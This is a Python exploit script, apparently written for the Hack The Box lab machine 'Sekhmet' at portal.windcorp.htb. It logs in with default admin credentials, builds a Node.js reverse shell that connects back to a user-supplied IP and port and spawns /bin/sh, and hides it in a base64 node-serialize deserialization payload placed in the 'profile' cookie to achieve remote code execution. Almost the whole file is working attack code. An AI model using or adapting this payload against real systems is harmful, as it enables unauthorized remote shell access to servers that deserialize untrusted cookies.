#!/usr/bin/python3

import requests
import argparse
import base64
from colorama import Fore,Style
import pyfiglet

class Deserialization:
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port

    def getCookies(self):

        url = 'http://portal.windcorp.htb/login'

        data = {'username': 'admin', 'password': 'admin'}
    
        session = requests.Session()

        response = session.post(url, data=data)

        return session.cookies.get_dict()




    def charencode(self,string):
        """String.CharCode"""
        encoded = ''
        for char in string:
            encoded = encoded + "," + str(ord(char))
        return encoded[1:]

    def createPayload(self):
        NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connection established with Ruby Shell!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (self.ip,self.port)
        return self.charencode(NODEJS_REV_SHELL)


    def createShell(self):
        url = 'http://portal.windcorp.htb/'
        
        data =  self.getCookies()
        cookie_app = data["app"]
        original_cookie = data["profile"]

        payload = '{"username":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(%s))}()"}' % self.createPayload()  
        encoded_payload = base64.b64encode(payload.encode()).decode('utf-8')
        cookie_profile = f'{encoded_payload}='
        cookies = {'app': cookie_app, 'profile': cookie_profile + original_cookie}
        
        response = requests.get(url, cookies=cookies)
        if(response.status_code == 200):
            print(Fore.GREEN + "\n[+]Wait for a connection using your netcat tool!")

        else:
            print(Fore.RED +"\n[-] Error Response!")

def main():
    #parametros
    parser = argparse.ArgumentParser(description="Sekhmet Shell by RubikCuv5")
    parser.add_argument("ip", help="your Ip tun0")
    parser.add_argument("port",help="your port")
    args = parser.parse_args()
    
    ip = args.ip
    port = args.port
    print(Fore.MAGENTA + (pyfiglet.figlet_format("Sekhmet Shell", font="graffiti", width=120)) +  Style.RESET_ALL)
    print(Fore.BLUE + f"[+] LHOST :{ip}")
    print(f"[+] LPORT : {port}" + Style.RESET_ALL)
    deserialize = Deserialization(ip,port)
    deserialize.createShell()
if __name__ == "__main__":
    main()
